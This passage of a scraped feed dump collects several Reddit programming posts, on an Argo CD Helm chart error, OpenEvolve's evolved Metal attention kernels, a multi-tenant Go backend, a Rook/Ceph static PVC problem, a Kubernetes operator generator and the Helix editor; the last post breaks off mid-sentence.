get command args to log: <code>helm pull --destination /tmp/abd0c23e-88d8-4d3a-a535-11d2d692e1dc --version 0.24.0 --repo https://cloudnative-pg.github.io/charts cnpg/cloudnative-pg</code> failed exit status 1: Error: chart \"cnpg/cloudnative-pg\" version \"0.24.0\" not found in <a href=\"https://cloudnative-pg.github.io/charts\">https://cloudnative-pg.github.io/charts</a> repository</p></blockquote><p>When I try running the command manually this also fails with the same message. So whats wrong here? Is argo using a wrong command to pull the helm chart?</p>","contentLength":1406,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Evolutionary Algorithm Automatically Discovers GPU Optimizations Beating Expert Code","url":"https://huggingface.co/blog/codelion/openevolve-gpu-kernel-discovery","date":1751126676,"author":"/u/asankhs","guid":174576,"unread":true,"content":"<em>How evolutionary code optimization achieved 12.5% performance improvements in transformer attention kernels</em><h2><a rel=\"nofollow\" href=\"https://huggingface.co/blog/codelion/openevolve-gpu-kernel-discovery#breakthrough-in-automated-gpu-optimization\"></a></h2><p>Using <a rel=\"nofollow\" href=\"https://github.com/codelion/openevolve\">OpenEvolve</a> - an open-source implementation of Google DeepMind's AlphaEvolve system - we've achieved a significant milestone: <strong>the automated discovery of GPU kernels that substantially outperform expert-engineered baselines</strong>.</p><p>This work demonstrates how OpenEvolve successfully optimized Metal kernels for transformer attention on Apple Silicon, achieving measurable performance improvements through evolutionary programming. More importantly, it shows the practical viability of automated code optimization for real-world systems.</p><h2><a rel=\"nofollow\" href=\"https://huggingface.co/blog/codelion/openevolve-gpu-kernel-discovery#%F0%9F%8E%AF-the-gpu-kernel-challenge\"></a></h2><p>One of the most challenging applications we've tackled with OpenEvolve is GPU kernel optimization. Modern transformer models depend heavily on optimized attention kernels, but creating high-performance GPU code requires deep expertise in:</p><ul><li>Hardware architecture specifics (Apple Silicon's unified memory, SIMD units)</li><li>Low-level programming languages (Metal Shading Language)</li><li>Numerical algorithm design (attention mechanisms, numerical stability)</li><li>Memory access pattern optimization</li></ul><p>We decided to test OpenEvolve's capabilities by targeting <strong>Qwen3-0.6B's Grouped Query Attention (GQA)</strong> implementation, attempting to outperform MLX's production-grade <code>scaled_dot_product_attention</code> kernel.</p><ul><li>: Qwen3-0.6B (40 query heads : 8 key-value heads)  </li><li>: Apple M-series GPUs with unified memory</li><li>: MLX's highly optimized attention implementation</li><li>: Discover Metal kernel optimizations automatically</li></ul><p>I configured OpenEvolve to evolve the Metal kernel source code while preserving the MLX integration infrastructure. The system began with a straightforward three-pass attention implementation and evolved it over 25 generations.</p><pre><code></code></pre><p>Each evolved kernel underwent comprehensive testing:</p><ul><li>: Numerical accuracy validation against MLX baseline</li><li>: 20 diverse inference scenarios (short/long context, generation tasks)</li><li>: GPU error detection and Metal memory validation</li><li>: Multiple runs with statistical analysis</li></ul><p>The evolutionary process autonomously discovered several optimizations that demonstrate algorithmic innovation:</p><h3><a rel=\"nofollow\" href=\"https://huggingface.co/blog/codelion/openevolve-gpu-kernel-discovery#1-apple-silicon-simd-optimization\"></a></h3><pre></pre><p>: The system discovered that 8-element vectors perfectly match Apple Silicon's SIMD width for 128-dimensional attention heads, maximizing hardware utilization without manual tuning.</p><h3><a rel=\"nofollow\" href=\"https://huggingface.co/blog/codelion/openevolve-gpu-kernel-discovery#2-algorithmic-breakthrough-two-pass-online-softmax\"></a></h3><pre></pre><p>: Reduced from three-pass to two-pass algorithm by fusing softmax normalization with value accumulation, significantly reducing memory bandwidth requirements.</p><h3><a rel=\"nofollow\" href=\"https://huggingface.co/blog/codelion/openevolve-gpu-kernel-discovery#3-gqa-specific-memory-layout-optimization\"></a></h3><pre></pre><p>: Exploits Qwen3's specific 40:8 head structure with optimized memory access patterns tailored to Apple Silicon's unified memory architecture.</p><p>The evolved kernel demonstrated significant improvements across comprehensive benchmarks:</p><h3><a rel=\"nofollow\" href=\"https://huggingface.co/blog/codelion/openevolve-gpu-kernel-discovery#aggregate-performance-gains\"></a></h3><ul><li>:  average improvement (σ = 38.3%)</li><li>:  average improvement (σ = 17.6%)</li><li>:  average improvement (σ = 30.7%)</li><li>:  average reduction (σ = 1.7%)</li><li>:  numerical accuracy maintained</li><li>:  GPU errors or kernel failures</li></ul><h3><a rel=\"nofollow\" href=\"https://huggingface.co/blog/codelion/openevolve-gpu-kernel-discovery#detailed-benchmark-results\"></a></h3><div><table><thead><tr></tr></thead><tbody><tr><td>Mixed results on very short sequences</td></tr><tr><td>High variance, strong improvements in some cases</td></tr><tr></tr><tr><td>Strongest category with 106% peak improvement</td></tr><tr><td>Robust performance under memory pressure</td></tr></tbody></table></div><p><strong>Peak Performance Achievement</strong>\nThe evolved kernel achieved <strong>106% decode speed improvement</strong> on repetitive pattern generation, demonstrating the kernel's effectiveness for certain workload characteristics.</p><ul><li> (&gt;25%): 7/20 benchmarks</li><li> (5-25%): 3/20 benchmarks  </li><li> (±5%): 4/20 benchmarks</li><li> (&lt;-5%): 6/20 benchmarks</li></ul><h2><a rel=\"nofollow\" href=\"https://huggingface.co/blog/codelion/openevolve-gpu-kernel-discovery#%F0%9F%9B%A1%EF%B8%8F-bulletproof-evaluation-system\"></a></h2><p>A critical aspect of this success was OpenEvolve's robust evaluation system, specifically designed to handle GPU kernel development challenges:</p><ul><li><strong>Command Buffer Protection</strong>: Automatic detection and recovery from Metal command buffer errors</li><li><strong>Memory Violation Handling</strong>: Safe handling of GPU memory access violations</li><li>: Exponential backoff for transient GPU errors</li><li>: Graceful degradation when kernels fail</li></ul><h3><a rel=\"nofollow\" href=\"https://huggingface.co/blog/codelion/openevolve-gpu-kernel-discovery#comprehensive-error-statistics\"></a></h3><pre><code>\n{\n    : {\n        : ,\n        : ,\n        : ,\n        : \n    }\n}\n</code></pre><p>This bulletproof approach enabled OpenEvolve to explore aggressive optimizations without crashing the evolution process - critical for GPU kernel development where experimental code frequently fails.</p><h3><a rel=\"nofollow\" href=\"https://huggingface.co/blog/codelion/openevolve-gpu-kernel-discovery#evolution-architecture-for-gpu-kernels\"></a></h3><p>The success required several OpenEvolve components working together:</p><ol><li>: Only the Metal kernel source was evolved, preserving MLX integration</li></ol><pre><code>\nkernel_source = </code></pre><ol start=\"2\"><li>: Evolution prompts included performance data, hardware specifications, and optimization guidelines</li><li>: Balanced performance, correctness, and safety metrics</li><li><strong>Hardware-Specific Validation</strong>: Apple Silicon-specific testing and optimization</li></ol><h3><a rel=\"nofollow\" href=\"https://huggingface.co/blog/codelion/openevolve-gpu-kernel-discovery#prompt-engineering-for-gpu-optimization\"></a></h3><p>The evolution prompts provided crucial context:</p><pre><code> Apple Silicon M-series GPU with unified memory\n SIMD width: 8 elements optimal for vec Thread group size: 32 threads for optimal occupancy\n\n Minimize memory bandwidth usage\n Maximize SIMD utilization\n Exploit GQA 40:8 head structure\n Maintain numerical stability\n\n\nCurrent decode speed: 140.6 tokens/sec\nTarget improvement: &gt;5% speedup required\n</code></pre><p>This GPU kernel optimization demonstrates several important principles:</p><h3><a rel=\"nofollow\" href=\"https://huggingface.co/blog/codelion/openevolve-gpu-kernel-discovery#1-automated-expertise-discovery\"></a></h3><p>OpenEvolve discovered optimizations requiring expertise in:</p><ul><li>Apple Silicon architecture details</li><li>Metal programming nuances  </li><li>Attention algorithm variants</li><li>Memory access pattern optimization</li></ul><p>No human engineer provided this domain knowledge - it emerged through evolutionary exploration.</p><h3><a rel=\"nofollow\" href=\"https://huggingface.co/blog/codelion/openevolve-gpu-kernel-discovery#2-hardware-specific-adaptation\"></a></h3><p>The optimizations are specifically tailored to Apple Silicon, showing OpenEvolve's ability to exploit hardware-specific features automatically.</p><h3><a rel=\"nofollow\" href=\"https://huggingface.co/blog/codelion/openevolve-gpu-kernel-discovery#3-algorithmic-innovation\"></a></h3><p>The two-pass online softmax represents a novel contribution that could be applied beyond this specific use case.</p><p>These aren't toy optimizations - they provide measurable improvements in real-world transformer inference workloads.</p><h2><a rel=\"nofollow\" href=\"https://huggingface.co/blog/codelion/openevolve-gpu-kernel-discovery#%F0%9F%9B%A0%EF%B8%8F-technical-infrastructure-improvements\"></a></h2><p>Since launch, we've significantly enhanced OpenEvolve's capabilities:</p><p>Full deterministic evolution for scientific reproducibility.</p><pre><code>python scripts/visualizer.py\n</code></pre><p>Interactive evolution trees with real-time performance tracking.</p><pre><code></code></pre><p>Parallel populations with migration for better exploration.</p><p>Automatic progress saving with resumable evolution sessions.</p><p>Based on the GPU kernel success, we're exploring several directions:</p><ul><li>: Extend beyond Apple Silicon to CUDA and ROCm</li><li>: Apply to other transformer components (layer normalization, activation functions)</li><li>: Optimize different attention patterns and model sizes</li></ul><ul><li>: Apply GPU insights to CPU optimization</li><li>: Evolve evaluation functions alongside solutions</li><li>: Simultaneous performance, energy, and accuracy optimization</li></ul><ul><li>: Continuous optimization in development pipelines</li><li>: Distributed evolution for large-scale optimization</li><li><strong>Domain-Specific Languages</strong>: Support for specialized computing environments</li></ul><p>The GPU kernel breakthrough demonstrates OpenEvolve's open architecture potential. Contributions are welcome in:</p><ul><li>Database query optimization</li><li>Network protocol implementations  </li><li>Scientific computing kernels</li><li>Compiler optimization passes</li></ul><h3><a rel=\"nofollow\" href=\"https://huggingface.co/blog/codelion/openevolve-gpu-kernel-discovery#infrastructure-improvements\"></a></h3><ul><li>Additional LLM integrations</li><li>Enhanced evaluation frameworks</li><li>Better visualization tools</li><li>Performance monitoring systems</li></ul><ul><li>Domain-specific tutorials</li><li>Optimization best practices</li></ul><p>Ready to try GPU kernel optimization or other challenging problems?</p><pre><code>git  https://github.com/codelion/openevolve.git\n openevolve\npip install -e .\n\n examples/mlx_metal_kernel_opt\npython openevolve-run.py initial_program.py evaluator.py --iterations 25\n</code></pre><p>The automated discovery of high-performance GPU kernels represents a significant milestone for OpenEvolve and automated programming. By achieving <strong>12.5% average decode speed improvements</strong> and  on real-world transformer workloads, this work demonstrates that evolutionary code optimization can compete with expert human engineering.</p><p>This success opens new possibilities for automated optimization across computing domains. As hardware architectures continue to evolve rapidly, tools like OpenEvolve become increasingly valuable for discovering optimizations that would be extremely difficult to find manually.</p>","contentLength":7670,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lmqdxu/evolutionary_algorithm_automatically_discovers/"},{"title":"[R] OpenEvolve: Automated GPU Kernel Discovery Outperforms Human Engineers by 21%","url":"https://www.reddit.com/r/MachineLearning/comments/1lmqbzc/r_openevolve_automated_gpu_kernel_discovery/","date":1751126540,"author":"/u/asankhs","guid":174577,"unread":true,"content":"<p>Hey folks, wanted to share something interesting I've been working on that might be relevant for folks running models locally on Apple Silicon.</p><p>Used evolutionary programming to automatically optimize Metal GPU kernels for transformer attention. Specifically targeted Qwen3-0.6B's grouped query attention (40:8 head ratio) running on Apple M-series GPUs through MLX.</p><p>Tested across 20 different inference scenarios against MLX's <code>scaled_dot_product_attention</code> baseline:</p><ul><li><strong>Average decode speed improvement: +12.5%</strong> (σ = 38.3%)</li><li> on repetitive pattern generation</li><li> average on general tasks</li><li> (slight reduction)</li></ul><p> It's workload dependent. Some scenarios saw big gains (+46.6% on dialogue, +73.9% on extreme-length generation), but others regressed (-16.5% on code generation). Success rate was 7/20 benchmarks with &gt;25% improvements.</p><p>The system automatically evolves the Metal kernel source code using LLMs while preserving the MLX integration. No human GPU programming expertise was provided - it discovered optimizations like:</p><ol><li><strong>Perfect SIMD vectorization</strong>: Found that  operations match Apple Silicon's capabilities for 128-dim attention heads</li><li>: Fused softmax normalization with value accumulation, reducing memory bandwidth</li><li><strong>GQA-specific memory patterns</strong>: Optimized for the 40:8 head structure with coalesced access patterns</li></ol><ul><li>Shows automated optimization can compete with expert-engineered kernels</li><li>Demonstrates potential for hardware-specific optimizations without manual tuning</li><li>Could be applied to other transformer components or different model architectures</li><li>All open source - you can reproduce and extend this work</li></ul><p>The code and all benchmarks are available in the <a href=\"https://github.com/codelion/openevolve\">OpenEvolve repo</a>. The MLX kernel optimization example is at <code>examples/mlx_metal_kernel_opt/</code>.</p><ul></ul><ul><li>Currently specific to Apple Silicon and this exact model configuration</li><li>Performance improvements are highly workload-dependent</li><li>Takes ~25 evolutionary generations to converge (few hours on M3)</li><li>No guarantees it'll work better for your specific use case</li></ul><p>Curious to hear thoughts from folks who've done MLX optimization work, or if anyone wants to try this on different models/configurations. The evolutionary approach seems promising but definitely has room for improvement.</p><p>Has anyone else experimented with automated kernel optimization for local inference?</p>","contentLength":2275,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"An open-source, multi-tenant backend engine in Go. Would you use this?","url":"https://www.reddit.com/r/golang/comments/1lmpm2j/an_opensource_multitenant_backend_engine_in_go/","date":1751124715,"author":"/u/jiteshgolecha","guid":174578,"unread":true,"content":"<p>For the past few months, I've been building a backend project which I will be most probably naming it as , and I'm considering open-sourcing it. Before I go through the effort of cleaning it up, documenting everything, and committing to maintenance, I wanted to get your thoughts and see if this is something the community would find useful.</p><p>The core idea was to build a \"Backend-as-a-Service\" (like PocketBase or Supabase) but designed from the ground up for <strong>true multi-tenancy with strict data isolation</strong>. Instead of using row-level security in a single database, <strong>gosaas gives every tenant their own dedicated PostgreSQL database,</strong><strong>which can be distributed across a fleet of database servers.</strong></p><p>I wanted this to be a true \"batteries-included\" backend, so it comes with a lot of the features you'd expect from a modern backend, all manageable via the API and a built-in Admin UI:</p><ul><li><strong>Multi-Server Architecture:</strong> Manage a fleet of PostgreSQL servers.  can automatically place new tenants on the least-loaded server.</li><li>Automagic CRUD API: Full POST, GET, PATCH, DELETE, and bulk PUT (upsert) endpoints for any collection.</li><li>Advanced Querying: The list endpoint supports rich filtering with &amp;&amp;, ||, (), sorting, pagination, and nested eager loading (?expand=ledger_id).</li><li>Dynamic Schema Builder: A set of admin APIs (and a UI) to dynamically create/alter collections and their columns (including relationships/foreign keys) across all tenants by automatically generating and running new migration files.</li><li>Dynamic, Scriptable Hooks: Instead of compiled Go hooks, you can write business logic in JavaScript (via Goja) and save it through the Admin UI. This allows for on-the-fly logic changes without redeploying the backend. We even have a \"recache\" button to pre-compile all hooks for performance.</li><li>Realtime API: WebSocket subscriptions for live updates on create, update, and delete events for any collection.</li><li>File Storage: A complete file management system with S3 as the storage backend.</li><li>Full-Text Search: Out-of-the-box integration with Meilisearch. Data in specified collections is automatically indexed.</li><li>Dynamic OpenAPI Docs: A  endpoint that automatically generates a full OpenAPI/Swagger specification by inspecting your tenant's live database schema with beautiful stoplight elements UI.</li><li>Authentication: <ul><li>Standard email/password login, password resets, and user invites.</li><li>Dynamic OAuth2: Admins can enable and configure providers (Google, GitHub, Apple, etc.) directly from the UI by adding their credentials, which are stored securely in the database.</li></ul></li><li>Observability: <ul><li>Monitoring endpoint (/metrics) for Prometheus or VictoriaMetrics, providing per-tenant stats.</li></ul></li><li>Admin UI: A complete SvelteKit single-page application, embedded into the final Go binary, for managing tenants, users, platform settings (S3/SMTP/OAuth keys), and the dynamic schema and hooks.</li></ul><p>My goal was to create something that feels extremely easy for the developer but is architecturally better suited for building SaaS products where tenant data isolation is a hard requirement and deployment is hassle free using a single binary.</p><p>So, my questions for you are:</p><ol><li>Is this something you would use?</li><li>What critical features do you think are missing?</li></ol><p>I'd love to hear any thoughts, criticisms, or suggestions you have. Thank you for your time!</p>","contentLength":3270,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Announcing Anathema - A TUI library with a templating system","url":"https://youtu.be/WmF1f5wWPRE","date":1751123419,"author":"/u/toggledbit","guid":175034,"unread":true,"content":"<!DOCTYPE html>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1lmp3m2/announcing_anathema_a_tui_library_with_a/"},{"title":"Can't create a Static PVC on Rook/Ceph","url":"https://www.reddit.com/r/kubernetes/comments/1lmohkm/cant_create_a_static_pvc_on_rookceph/","date":1751121850,"author":"/u/francismedeiros","guid":174487,"unread":true,"content":"<p>I have installed Rook on my k3s cluster, and it works fine. I created a  for my CephFS pool, and I can dynamically create PVC's normally.</p><p>Thing is, I really would like to use a (sub)volume that I already created. I followed the instructions <a href=\"https://github.com/ceph/ceph-csi/blob/devel/docs/static-pvc.md#cephfs-static-pvc\">here</a>, but when the test container spins up, I get: </p><p><code> Warning FailedAttachVolume 43s attachdetach-controller AttachVolume.Attach failed for volume \"test-static-pv\" : timed out waiting for external-attacher of cephfs.csi.ceph.com CSI driver to attach volume test-static-pv </code></p><p><code> apiVersion: v1 kind: PersistentVolume metadata: name: test-static-pv spec: accessModes: - ReadWriteMany capacity: storage: 1Gi csi: driver: cephfs.csi.ceph.com nodeStageSecretRef: # node stage secret name name: rook-csi-cephfs-node # node stage secret namespace where above secret is created namespace: rook-ceph volumeAttributes: # optional file system to be mounted \"fsName\": \"mail\" # Required options from storageclass parameters need to be added in volumeAttributes \"clusterID\": \"mycluster\" \"staticVolume\": \"true\" \"rootPath\": \"/volumes/mail-storage/mail-test/8886a1db-6536-4e5a-8ef1-73b421a96d24\" # volumeHandle can be anything, need not to be same # as PV name or volume name. keeping same for brevity volumeHandle: test-static-pv persistentVolumeReclaimPolicy: Retain volumeMode: Filesystem </code></p><p>I tried many times, but it simply will give me the same error.</p><p>Any ideas on why this is happening?</p>","contentLength":1405,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"To all EU citizens plz sign the consumer Initiative 'Stop Killing Games' + ping your friends","url":"https://www.reddit.com/r/linux/comments/1lmoh9e/to_all_eu_citizens_plz_sign_the_consumer/","date":1751121828,"author":"/u/Thalia-the-nerd","guid":174490,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Feedback wanted: We’re auto-generating Kubernetes operators from OpenAPI specs (introducing oasgen-provider)","url":"https://www.reddit.com/r/kubernetes/comments/1lmo90i/feedback_wanted_were_autogenerating_kubernetes/","date":1751121230,"author":"/u/braghettosvr","guid":174572,"unread":true,"content":"<p>I wanted to share a project we’ve been working on at <a href=\"https://github.com/krateoplatformops\">Krateo PlatformOps</a>: it's called <a href=\"https://github.com/krateoplatformops/oasgen-provider\"></a>, and it’s an open-source tool that generates Kubernetes-native operators from OpenAPI v3 specs.</p><p>The idea is simple: 👉 Take any OpenAPI spec that describes a RESTful API<p> 👉 Generate a Kubernetes Custom Resource Definition (CRD) + controller that maps CRUD operations to the API</p> 👉 Interact with that external API through kubectl like it was part of your cluster</p><p>Use case: If you're integrating with APIs (think cloud services, SaaS platforms, internal tools) and want GitOps-style automation  writing boilerplate controllers or glue code, this might help.</p><p>🔧 <strong>How it works (at a glance):</strong></p><ul><li>You provide an OpenAPI spec (e.g. GitHub, PagerDuty, or your own APIs)</li><li>It builds a controller with reconciliation logic to sync spec → external API</li></ul><p>We’re still evolving it, and would love  from the community:</p><ul><li>Is this useful for your use case?</li><li>Have you seen similar approaches or alternatives?</li><li>Would you want to contribute or try it on your API?</li></ul><p>Thanks in advance for any thoughts you have!</p>","contentLength":1068,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"I really like the Helix editor.","url":"https://herecomesthemoon.net/2025/06/i-like-helix/","date":1751120842,"author":"/u/SophisticatedAdults","guid":174488,"unread":true,"content":"<p>\n              The <a href=\"https://helix-editor.com/\" target=\"_blank\">Helix editor</a> is a modal\n              (read: Vim-like) <a href=\"http://kakoune.org/\" target=\"_blank\">Kakoune-inspired</a> ‘batteries included’\n              terminal editor with sane defaults and a focus on multiple cursors and selection-based editing.\n            </p><p>There are a lot of reasons to like the Helix editor.</p><p>\n              One of my favorite ones is how good it is at handling vaguely structured data (e.g. structured logs, JSON\n              output, etc.), outside of the realm of standard LSP-powered code editing. More about that later.\n            </p><p>\n              That’s also when I’ll tell you why, yes, that ‘search and replace in file’ popup most modern editors have\n              is actually Bad™.\n            </p><p>\n              Here’s a demo of me using Helix to process a large JSON file. I’m extracting a list of all locations of\n              resources deployed in 2025 with just a few keypresses. It’s not very hard. Pay special attention to the\n               in the lower right corner.\n            </p><div><figure data-imgstate=\"dither\"><div><figcaption></figcaption></div></figure></div><p>\n              One last thing before we get started: I’ll compare Helix to Vim in the following, but don’t make the\n              mistake of assuming that I’d be happier with e.g. VSCode. Many of my reasons for disliking VSCode are\n              pretty similar to my reasons for disliking Vim, and this includes the\n              <a href=\"https://stackoverflow.com/questions/4087999/shortcut-for-replace-button-in-find-and-replace-dialog?rq=3\" target=\"_blank\">issues with highly context-specific and hard to learn keybinds</a>.\n            </p><h2>\n              Getting the obvious one out of the way: It just works.\n            </h2><p>\n              Everything just works out of the box. It’s a pretty massive difference from the world of Vim, where a\n              significant investment to figure out how to customize your editor to your liking is required.\n            </p><p>\n              A barebones Neovim install neither has Treesitter set up nor manages to connect to my installed LSPs! Not\n              without first dealing with some\n              <a href=\"https://github.com/neovim/nvim-lspconfig\" target=\"_blank\">config fiddling and plugin setup</a>,\n              anyway.\n            </p><p>\n              (If you’re not familiar with LSPs, basically all semantics-aware features of (most) modern IDEs are\n              handled by the Language Server Protocol (LSP). This includes ‘red squiggles’ beneath errors, renaming\n              variables, jumping to definitions, autocompletion, and so on. What this basically means is that as long as\n              your editor supports LSPs, it can do <em>all of the same stuff VSCode does</em>. This makes switching\n              between modern editors pretty painless, as far as capabilities go. Most of them use the same LSPs!)\n            </p><p>\n              In Helix, if I press a button such as  (which still corresponds to , just\n              like in Vim), it will automatically pop up a list of available options for me. If I press\n               (which corresponds to a bunch of ‘higher level’ operations or interactions with\n              specific tools), the same happens. See for yourself:\n            </p><p>\n              I cannot overstate how big of a deal this feature is. Discoverability is a big deal. If your users don’t\n              know that a feature exists, they won’t use it. If they don’t even know how to easily figure out\n               a feature they’re looking for exists, it’s basically game over.\n            </p><p>\n              There’s a few more examples of easy usability.  and <a href=\"https://docs.helix-editor.com/keymap.html#unimpaired\" target=\"_blank\">work as in Vim-unimpaired</a>, and allow you to jump to the previous/next function, test, diagnostic, paragraph, change, etc.\n            </p><p>\n              Likewise,  allows manipulation of ‘surrounding’ characters or syntactic structures. This\n              includes jumping between pairs of brackets, selecting a string literal, test, or function, diff, etc.\n            </p><p>\n              This is nice! Treesitter is nice. I don’t know how easy it is to delete a function or testcase in your\n              editor of choice, but there’s something nice about the fact that I can just type  to\n              select an entire function, and then delete it with a single button press. (And, most importantly, that the\n              same principle extends to everything else.)\n            </p><p>\n              The fuzzy pickers are great. I can type  and get a fuzzy picker that shows all\n              available editor commands or  to get a fuzzy finder over all symbols (e.g.\n              function names) across the entire repository, and then immediately jump to them.\n            </p><p>\n              All of the pickers work in the same unified way, even! It’s like\n              <a href=\"https://github.com/nvim-telescope/telescope.nvim\" target=\"_blank\">Nvim’s Telescope</a>, except\n              there’s no need to scroll through a Github page through multiple dependency sections, an install section\n              with four different options (depending on which plugin manager you’re using), and a long list of commands\n              that you first need to map to your own personal keybinds.\n            </p><p>\n              You probably lose  customizability, but “I have a deep, intense need to customize the way my\n              fuzzy finder editor plugin integrates into my bespoke coding workflow and external dependencies.” falls\n              firmly into the category of “Sentences spoken by the utterly deranged” for me.\n            </p><p>\n              Anyway, just in case you’re getting worried we’re losing the fundamentals, all of the ‘standard’ Vim\n              features are supported. The keybinds are somewhat different, but similar enough that picking it up and\n              being productive didn’t take very long.\n            </p><p>I was productive in ~2 hours, and have been using it as my daily driver for over a year by now.</p><p>\n              I can record macros and replay them. I can type  to pipe each of my selections into a shell\n              command and replace them with the output. I can yank to registers, paste, search for regex patterns, split\n              and tile my screen, jump around in various ways, etc.\n            </p><p>Don’t get me wrong, Vim’s customizability and plugin system are one of its biggest strengths.</p><p>\n              This is why Vim is capable of handling\n              <a href=\"https://github.com/jupyter-vim/jupyter-vim\" target=\"_blank\">Jupyter Notebooks</a>, which is\n               something you can say about Helix (for now).\n            </p><p>\n              That doesn’t change the equation, though: Requiring everyone to do their own bespoke setup and config\n              fiddling isn’t great. That’s a lot of time people have to put into it just for some basic functionality,\n              and in the end  will end up with something slightly different.\n            </p><p>\n              Anyway. I acknowledge that “Helix is basically like Vim, except everything works out of the box, and you\n              don’t have to deal with 30 year old historical baggage.” isn’t much of a selling point for people who’ve\n              already spent hours setting up an entire dependency chain of Vim plugins on their computer.\n            </p><p>\n              That’s fine by me. As for myself, I’m tired of shaving that particular yak. I want something that “just\n              works”  has a composable modal interface.\n            </p><p>\n              I much prefer to shave other, slightly less hairy yaks. Preferably ones that are marginally closer to the\n              projects I’m actually interested in working on, y’see.\n            </p><p>\n              Before we get into the whole selection-based editing part (aka ‘stuff that makes Helix unique and is\n              cool’), here’s my entire Helix config:\n            </p><div><pre tabindex=\"0\"><code data-lang=\"toml\"></code></pre></div><p>\n              Please take note of how short it is. This is what I used when writing this very post.</p><p>\n              Meanwhile, in the world of Vim you find\n              <a href=\"https://github.com/ntk148v/neovim-config\" target=\"_blank\">Github repositories</a> that\n              self-describe as ‘minimal neovim configuration’ and contain over a dozen files of Lua and a few hundred\n              lines of code full of side effects.\n            </p><p>\n              Needless to say, I’m not much of a fan of fancy ‘Vim-with-batteries-included’ setups like\n              <a href=\"https://www.lunarvim.org/\" target=\"_blank\">LunarVim</a> either.\n            </p><p>\n              LunarVim essentially stacks a ton of plugins on top of Neovim to make it look like VSCode. I’ve never been\n              a fan, honestly. When I used Neovim, even a moderate amount of plugin resulted in some performance issues,\n              whereas Helix just feels a lot , and less brittle.\n            </p><p>If you’re into this, more power to you. It’s just not for me.</p><p>\n              What I  like about Helix is its ability to manipulate to easily manipulate multiple\n              selections and cursors. It gives you a few basic, very powerful tools, which I reach for\n              , just because of how versatile they are.\n            </p><p>\n              You’ve already seen me use multi-cursor editing in the demo video at the start of the post. I’ll go into\n              more detail in this section.\n            </p><p>\n              When writing , using the Language Server to ‘rename a variable’ is pretty easily the best\n              workflow there is. It will query all of the usages, and just rename them. It will even return an error if\n              you run into name collision issues.\n            </p><p>\n              When that doesn’t work for whatever reason, you’re usually forced to reach for second-class tools such as\n              Vim’s terrible  workflow or the standard GUI search-and-replace\n               (which is also terrible).\n            </p><p>\n              If it’s not clear why the search-and-replace popup window is bad, it’s because it’s “glued onto” the main\n              editor, and poorly interacts with the rest of the program.\n            </p><ol><li>\n                It results in the existence of ’editor focus’. Your editor will either be focused on the popup window or\n                on the main input window, both of which have their own keybinds and behavior. Even switching this focus\n                probably requires its own keybind, separate from alt-tabbing.\n              </li></ol><p>\n              It’s just so much more fiddly and complex than it has any right to be.\n              <em>Editing text should leverage the main editor window and input methods, not have its own bespoke\n                interface. This is the GUI equivalent of a bespoke DSL that doesn’t compose with anything else.</em></p><p>In Helix, what you would instead do is the following:</p><ol><li>Press . This selects the entire file.</li><li>Press . This opens a ‘select’ input field in the command bar.</li><li>\n                Type . This will narrow down your current selection to only select all matches of\n                . In other words, you now have every match of  in your file selected.\n              </li><li>Type . This replaces each selection with a cursor, and puts you into insert mode.</li><li>Type . You’re editing all instances at the same time.</li></ol><p>\n              And you’re done. The reason why this is so powerful is that it . Instead of having to\n              find a single regex which matches  instance of your string (or having to write a macro), you\n              can narrow it down using repeated applications of  or other selection-primitives.\n            </p><p>\n              Other selection-primitives include (for example)  (for keeping only those selections that\n              include a given pattern) or  for removing those that contain a given pattern,\n               for selecting an entire line,  for trimming whitespace and the whole\n              selection of  keybinds for selecting quotes or braces.\n            </p><p>\n              This gets fancier with Treesitter features: Take some arbitrary Rust file. Press , then\n              , then type , and you selected the  keyword in every\n              top-level function. Now press , to extend the selection to the surrounding syntactic\n              element, i.e. the entire function.\n            </p><p>\n              This is stuff you can do. It’s easy. It might sound like a fancy gimmick—and that’s because it is—but that\n              doesn’t keep it from being composable and easy.\n            </p><h3>Handling semi-structured logs</h3><p>\n              Perhaps my first real ‘programming project’ was a Discord bot, written in Python and using\n              <a href=\"https://discordpy.readthedocs.io/\" target=\"_blank\">Discordpy</a>. It’s still running to this day,\n              and had an uptime of a full year before I decided to update it not too long ago.\n            </p><p>I  proud of it, but it’s by no means an example of excellent engineering practices.</p><p>My Discord bot spits out logs that look something like this here:</p><div><pre tabindex=\"0\"><code data-lang=\"toml\"></code></pre></div><p>\n              Wow, that sure looks like ass. I sure wish there were a way to  and inspect this\n              file. Something that would make it easy to figure out what’s going on without having scroll through the\n              thing carefully looking for whatever entry I might be looking for.\n            </p><ol><li>\n                Select the whole file, then use  to split my selection into lines. I now have selected\n                each line individually.\n              </li><li>\n                Press , and then  to only keep those lines that  start\n                with a number.\n              </li><li>\n                Press  to delete all of them. Now all of the traceback lines are gone. (I might need them\n                later, but for now I’m just considering them noise.)\n              </li></ol><p>\n              Using a similar approach, I can delete all lines that only contain an  log, and all logs\n              that are too old, or those that don’t contain certain keywords that I am looking for, etc.\n            </p><p>\n              I arrive at a very slim, trimmed down log file that only contains the information I need. It takes me a\n              few seconds, and is not hard to learn. I already told you all of the keybinds.\n            </p><p>\n              I’ve not seen a single tool that makes processing semi-structured data  easy. It’s laughably\n              flexible.\n            </p><h3>Curl, JSON, Config files…</h3><p>\n              Imagine you’re calling some sort of API and ask it to list all of your . You might be\n              using , and just want to quickly figure something out here.\n            </p><p>Say, you’re interested in figuring out all the locations in which you’ve got widgets deployed.</p><p>\n              For the sake of the argument and considering the absolute state of modern software development, let’s\n              assume there’s no easier way of doing this. In fact, the web portal associated with the API is a dumpster\n              fire and would require you to scroll through a few dozen pages of widgets and count manually.\n            </p><p>\n              The widget schema might be something like this here, and your curl call will spit out a whole list of\n              objects in this format.\n            </p><div><pre tabindex=\"0\"><code data-lang=\"json\"></code></pre></div><p> you could pipe your  call directly into Helix.</p><p>At that point it’s simple, and doesn’t require learning a bespoke DSL.</p><p> how you end up at the demo from the intro. That’s a workflow of a few seconds which allows\n              me to pick any arbitrary sub-value out of the 